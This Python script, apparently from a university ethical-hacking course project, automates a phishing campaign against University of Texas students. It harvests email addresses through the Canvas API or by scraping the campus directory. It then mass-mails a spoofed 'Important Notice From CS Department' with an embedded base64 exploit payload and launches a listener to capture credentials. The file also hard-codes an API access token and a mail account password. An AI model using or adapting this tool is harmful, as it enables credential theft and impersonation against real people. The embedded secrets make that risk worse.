import sys
import argparse                    #parsing command line args
from bs4 import BeautifulSoup      #webscraping
from subprocess import call
import requests
import json
import time
import httplib
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from base64 import b64encode
import socket

####### HOW TO RUN THIS FILE ###########
# elit3_h4ck -efile filename.txt        #uses email addresses in text file
# elit3_h4ck -nfile filename.txt        #uses UT student names in text file
# elit3_h4ck -cid integer               #pulls email addresses from canvas based on course id

# get student names from canvas OR pre written file
# look up student email addresses from canvas api OR UT directory
# add emails to list for phishing attack
# send advising phishing email
# start up server listening for clicked requests
# 
# Canvas courses api
# https://canvas.instructure.com/doc/api/courses.html
# Canvas Oauth2
# https://canvas.instructure.com/doc/api/file.oauth.html

COURSE_ID = 1195393  #default value for cs378 ethical hacking
ACCESS_TOKEN = '1017~DSH05LRqWUsyMocT6hCsMHNuX2gA6Yl6NJlt0Zwnsde0uj9xC8bT66YhlmSgva6g'
email_list = []

# Thank you to https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
# for this code
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def call_canvas(path, request_type='GET', data=None):
    connection = httplib.HTTPSConnection("utexas.instructure.com")
    headers = {"Content-type": "application/json", "Authorization": "Bearer " + ACCESS_TOKEN}

    json_data = json.dumps(data) if data is not None else ""
    connection.request(request_type, "/api/v1/" + path, json_data, headers)
    response = connection.getresponse()
    s = response.read().decode()
    return json.loads(s)

def get_canvas_emailaddr(cur_course_id):
    #returns a list of up to 100 student names and emails given a course ID
    student_info = call_canvas("courses/{}/users?per_page=100&include[]=email".format(cur_course_id))
    build_email_list = []
    for student in student_info:
        try:
            build_email_list.append(student['email'])
            # print(name['name'] + '        ' + name['email'])
        except:
            print('!!!!!  Invalid course ID  !!!!!!\n!!!!!  Course doesn\'t exist or you are not enrolled  !!!!!!')
            return list()
    return build_email_list

def ut_directory_lookup(student_names):
    # GET request to UT directory, webscrape for email address
    build_email_list = []
    for name in student_names:
        name_array = name.split()
        request_url = 'https://directory.utexas.edu/index.php?q=' # Set destination URL here
        request_url += name_array[0] + '+' + name_array[1]
        request_url += '&scope=all&submit=Search'
        print(request_url)

        page = requests.get(request_url)
        soup = BeautifulSoup(page.content, "html.parser")

        table = soup.find_all('table', class_='dir_info')
        for row in table:
            cells = row.find_all('tr')
            for tr in cells:
                tds = tr.find_all('td')
                if 'Email:' in str(tds[0].text):
                    build_email_list.append( str(tds[1].text)[1:-1] )
    return build_email_list

####################################
# Parse c-line args to determine where to get email addresses
####################################
parser = argparse.ArgumentParser(description="Send email addresses a UT registration phishing attack.")
parser.add_argument('-efile', help='file of email addresses')
parser.add_argument('-nfile', help='file of UT student names')
parser.add_argument('-cid', help='find email addresses from canvas course id')
args = parser.parse_args()

if args.efile:
    #gets email addresses from a text file
    print("Sending phishing emails to addresses in file ~" + args.efile + "~")
    file = open(args.efile, "r")
    try:
        email_list = file.read().splitlines()
    finally:
        file.close()

if args.nfile:
    print("Sending phishing emails to names in file ~" + args.nfile + "~")
    COURSE_ID = args.nfile
    file = open(args.nfile, "r")
    try:
        student_names = file.read().splitlines()
    finally:
        file.close()
    # find student names from ut directory
    email_list = ut_directory_lookup(student_names)

if args.cid:
    print("Sending phishing emails to addresses found in UT course ID: " + args.cid)
    COURSE_ID = args.cid
    # find student names from canvas api
    email_list = get_canvas_emailaddr(COURSE_ID)

# I have now compiled all of the email addresses I wish to send a phishing attack to
####################################
# send email to list of addresses
####################################
FROM_ADDR = 'cs378_final_project@hushmail.com'
PASSWD = 'hacker1234'
OUR_IP = get_ip_address()

msg = MIMEMultipart()
msg['From'] = 'Secure Academic Notice <{}>'.format(FROM_ADDR)
msg['Subject'] = 'Important Notice From CS Department'
with open('phishing_email.txt', 'rb') as phish_mail_file:
    with open('exploit.js', 'rb') as exploit_file:
        exploit_str = exploit_file.read();
        exploit = b64encode(exploit_str.replace("OUR_IP_ADDRESS_HERE", OUR_IP))
        raw_phish_html = phish_mail_file.read();
        phish_html = raw_phish_html.replace("BASE64_EXPLOIT_HERE", exploit);
        msg.attach(MIMEText(phish_html, 'html'))


server = smtplib.SMTP_SSL('smtp.hushmail.com', 465)
server.set_debuglevel(5)
server.login(FROM_ADDR, PASSWD)

for target in email_list:
    del msg['To']
    msg['To'] = target
    print(target)
    #print msg.as_string()
    server.sendmail(FROM_ADDR, target, msg.as_string())
    time.sleep(1)

server.quit()


#####################################
# listener for clicked submit buttons on our fake web server
# ####################################
print('!!! Starting server to listen for credentials !!!')
call(['python3', 'evil_server.py'])


#####################################
# save/use stolen credentials
####################################
#



